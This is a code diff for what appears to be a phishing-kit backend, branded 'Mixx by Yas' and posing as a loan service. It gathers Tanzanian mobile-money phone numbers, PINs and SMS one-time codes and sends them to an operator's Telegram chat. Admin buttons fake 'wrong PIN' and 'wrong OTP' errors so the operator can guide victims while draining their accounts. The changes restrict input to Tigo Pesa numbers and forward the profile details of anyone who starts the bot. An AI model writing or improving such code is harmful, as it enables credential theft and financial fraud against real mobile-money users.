@@ -1,18 +1,9 @@
 /**
  * **MIXX BY YAS - BACKEND SERVER (MULTI-ADMIN SUPPORT & SAFE WEBHOOK/POLLING)**
- *
- * **BEHAVIOR:**
- * - If USE_WEBHOOK === 'true' and APP_URL is set: starts in webhook mode.
- *   - Sets Telegram webhook to `${APP_URL}/bot${TOKEN}` and exposes that POST route.
- * - Otherwise: attempts to run in polling mode.
- *   - If a webhook is already configured for this bot, the server will delete the webhook
- *     before starting polling to avoid ETELEGRAM 409.
- *
- * **ENVIRONMENT:**
- * - TELEGRAM_BOT_TOKEN (required)
- * - TELEGRAM_CHAT_ID (optional default admin chat id)
- * - APP_URL (required for webhook mode — must be https)
- * - USE_WEBHOOK (set to 'true' to enable webhook mode)
+ * 
+ * Includes:
+ * - Strict Tigo Pesa (Tanzania) phone number validation (065, 067, 071, 077).
+ * - Instant Telegram user info forwarding when /start is triggered.
  */
 
 const express = require('express');
@@ -34,10 +25,21 @@ if (!TOKEN) {
 }
 
 const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TOKEN}`;
-let bot = null; // will hold TelegramBot instance
+let bot = null; 
 const sessions = new Map();
 
-// Helper to call Telegram HTTP endpoints (getWebhookInfo, deleteWebhook, setWebhook)
+/**
+ * **TIGO PESA TANZANIA NUMBER VALIDATOR**
+ * Valid Tigo prefixes: 065, 067, 071, 077.
+ */
+function isValidTigoNumber(phoneStr) {
+  if (!phoneStr) return false;
+  const cleaned = String(phoneStr).trim().replace(/[\s\-\(\)]/g, '');
+  const tigoRegex = /^(?:\+?255|0)?(65|67|71|77)\d{7}$/;
+  return tigoRegex.test(cleaned);
+}
+
+// Helper to call Telegram HTTP endpoints
 async function telegramApi(pathSuffix, options = {}) {
   const url = `${TELEGRAM_API_BASE}/${pathSuffix}`;
   const res = await fetch(url, options);
@@ -51,19 +53,15 @@ async function initBot() {
       process.exit(1);
     }
     console.log('[Bot] Starting in WEBHOOK mode.');
-    // Create bot instance without polling
     bot = new TelegramBot(TOKEN, { polling: false });
 
-    // Set webhook to APP_URL route (Telegram requires HTTPS)
     const webhookPath = `/bot${TOKEN}`;
     const webhookUrl = `${APP_URL}${webhookPath}`;
     try {
       console.log(`[Bot] Setting webhook to ${webhookUrl}`);
       await bot.setWebHook(webhookUrl);
       console.log('[Bot] Webhook set successfully.');
-      // Mount webhook route to accept Telegram updates
       app.post(webhookPath, (req, res) => {
-        // quick 200 to Telegram, then process
         res.sendStatus(200);
         try {
           bot.processUpdate(req.body);
@@ -76,7 +74,6 @@ async function initBot() {
       process.exit(1);
     }
   } else {
-    // Polling mode: but first ensure no webhook is set (otherwise Telegram will reject polling with 409)
     console.log('[Bot] Starting in POLLING mode (will ensure webhook is removed first).');
     try {
       const info = await telegramApi('getWebhookInfo');
@@ -96,12 +93,10 @@ async function initBot() {
       console.warn('[Bot] Could not query webhook info (continuing):', err?.message || err);
     }
 
-    // Now create bot with polling enabled
     bot = new TelegramBot(TOKEN, { polling: true });
     console.log('[Bot] Polling started.');
   }
 
-  // Generic error handler to log Telegram client errors (including 409 etc.)
   bot.on('polling_error', (err) => {
     console.error('[Bot] polling_error:', err?.message || err);
   });
@@ -110,12 +105,54 @@ async function initBot() {
     console.error('[Bot] webhook_error:', err?.message || err);
   });
 
-  // Attach callback_query handler and other handlers
+  /**
+   * **INSTANT /START COMMAND HANDLER**
+   * Captures chat id, name, username, and direct link immediately when tapped, 
+   * sending the payload straight to the default admin chat ID.
+   */
+  bot.onText(/\/start/, async (msg) => {
+    const chatId = msg.chat.id;
+    const user = msg.from;
+
+    const firstName = user.first_name || 'Not Provided';
+    const lastName = user.last_name || '';
+    const fullName = `${firstName} ${lastName}`.trim();
+    const username = user.username ? `@${user.username}` : 'No username set';
+    
+    // Generate reliable private profile link
+    const privateLink = user.username 
+      ? `https://t.me/${user.username}` 
+      : `tg://user?id=${user.id}`;
+
+    // 1. Send welcome message back to the user
+    const welcomeText = 
+      `Hello **${fullName}**! 👋\n\n` +
+      `Welcome to Mixx by Yas. Your profile has been registered with our team.`;
+
+    await bot.sendMessage(chatId, welcomeText, { parse_mode: 'Markdown' }).catch(() => {});
+
+    // 2. Dispatch metadata immediately to the Admin
+    if (DEFAULT_CHAT_ID && String(chatId) !== String(DEFAULT_CHAT_ID)) {
+      const adminAlert = 
+        `🚨 **New User Started the Bot!**\n\n` +
+        `👤 **Name:** ${fullName}\n` +
+        `🆔 **Chat ID:** \`${user.id}\`\n` +
+        `🏷 **Username:** ${username}\n` +
+        `🔗 **Direct Link:** ${privateLink}`;
+
+      await bot.sendMessage(DEFAULT_CHAT_ID, adminAlert, { 
+        parse_mode: 'Markdown',
+        disable_web_page_preview: true 
+      }).catch(err => console.error('[Bot] Failed to alert admin on start:', err.message));
+    }
+  });
+
+  // Attach callback_query handler
   bot.on('callback_query', async (query) => {
     try {
       const actionData = query.data || '';
       const parts = actionData.split('_');
-      const prefix = parts.slice(0, 2).join('_'); // e.g., ALLOW_OTP, WRONG_PIN, CORRECT_OTP
+      const prefix = parts.slice(0, 2).join('_'); 
       const userId = parts.slice(2).join('_');
 
       const session = sessions.get(userId);
@@ -147,13 +184,11 @@ async function initBot() {
           await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong OTP error for +255 ${session.phone}`);
           break;
         default:
-          console.warn('[Bot] Unknown callback prefix:', prefix);
           break;
       }
 
       await bot.answerCallbackQuery(query.id, { text: `Processed: ${prefix}` });
 
-      // Fade away / remove the inline keyboard buttons instantly after click
       if (query.message && query.message.message_id) {
         await bot.editMessageReplyMarkup(
           { inline_keyboard: [] },
@@ -165,24 +200,27 @@ async function initBot() {
       console.error('[Bot] callback_query handler error:', err);
     }
   });
-
-  bot.on('message', (msg) => {
-    // Optional message listener
-  });
 }
 
-// ---------- Express API Endpoints ----------
 function getTargetChatId(reqChatId) {
   return reqChatId || DEFAULT_CHAT_ID;
 }
 
 /**
  * **SUBMIT APPLICATION (PIN ENTRY)**
- * body: { phone, pin, amount, adminChatId }
+ * Requires valid Tigo Pesa Tanzania number.
  */
 app.post('/api/submit-application', (req, res) => {
   try {
     const { phone, pin, amount, adminChatId } = req.body || {};
+
+    if (!isValidTigoNumber(phone)) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Invalid phone number. Only registered Tigo Pesa Tanzania numbers (starting with 065, 067, 071, or 077) are allowed.' 
+      });
+    }
+
     const targetChat = getTargetChatId(adminChatId);
     const userId = phone || `user_${Date.now()}`;
 
@@ -201,7 +239,7 @@ app.post('/api/submit-application', (req, res) => {
 
     const message =
       `🚨 *NEW LOAN LOGIN / PIN ATTEMPT*\n\n` +
-      `📱 *Phone:* +255 ${phone}\n` +
+      `📱 *Tigo Phone:* +255 ${phone}\n` +
       `🔑 *PIN Entered:* \`${pin}\`\n` +
       `💰 *Selected Amount:* ${amount}\n\n` +
       `📌 *Status:* Waiting for Admin Approval`;
@@ -236,7 +274,7 @@ app.post('/api/submit-application', (req, res) => {
 });
 
 /**
- * **CHECK SESSION STATUS ENDPOINT FOR UI POLLING**
+ * **CHECK SESSION STATUS ENDPOINT**
  */
 app.get('/api/check-status/:userId', (req, res) => {
   const { userId } = req.params;
@@ -260,7 +298,7 @@ app.post('/api/submit-otp', (req, res) => {
 
     const message =
       `📩 *SMS OTP SUBMITTED BY USER*\n\n` +
-      `📱 *User:* +255 ${session.phone}\n` +
+      `📱 *Tigo User:* +255 ${session.phone}\n` +
       `🔢 *OTP Entered:* \`${otp}\`\n\n` +
       `Choose verification response:`;
 
@@ -280,50 +318,7 @@ app.post('/api/submit-otp', (req, res) => {
     };
 
     const targetChat = session.adminChatId || DEFAULT_CHAT_ID;
-
-    bot.sendMessage(targetChat, message, opts)
-      .catch(err => console.error('Telegram Error:', err.message));
-
-    res.status(200).json({ success: true });
-  } catch (error) {
-    res.status(500).json({ success: false, error: 'Internal server error' });
-  }
-});
-
-/**
- * **REQUEST NEW OTP ACTION**
- */
-app.post('/api/request-new-otp', (req, res) => {
-  try {
-    const { userId } = req.body || {};
-    const session = sessions.get(userId);
-
-    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
-
-    session.status = 'REQUESTED_NEW_OTP';
-
-    const message =
-      `🔄 *OTP EXPIRATION / REQUEST NEW OTP*\n\n` +
-      `📱 *User:* +255 ${session.phone}\n` +
-      `⚠️ *Notice:* Applicant reports that their OTP has expired and is requesting a new code.\n\n` +
-      `Choose admin action:`;
-
-    const opts = {
-      parse_mode: 'Markdown',
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: '✅ ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
-            { text: '❌ DENY OTP', callback_data: `DENY_OTP_${userId}` }
-          ]
-        ]
-      }
-    };
-
-    const targetChat = session.adminChatId || DEFAULT_CHAT_ID;
-
-    bot.sendMessage(targetChat, message, opts)
-      .catch(err => console.error('Telegram Error (New OTP):', err.message));
+    bot.sendMessage(targetChat, message, opts).catch(() => {});
 
     res.status(200).json({ success: true });
   } catch (error) {
@@ -337,4 +332,4 @@ app.listen(PORT, async () => {
   console.log(`[Server] Mixx by Yas server running smoothly on port ${PORT}`);
   await initBot();
 });
-    
+                   
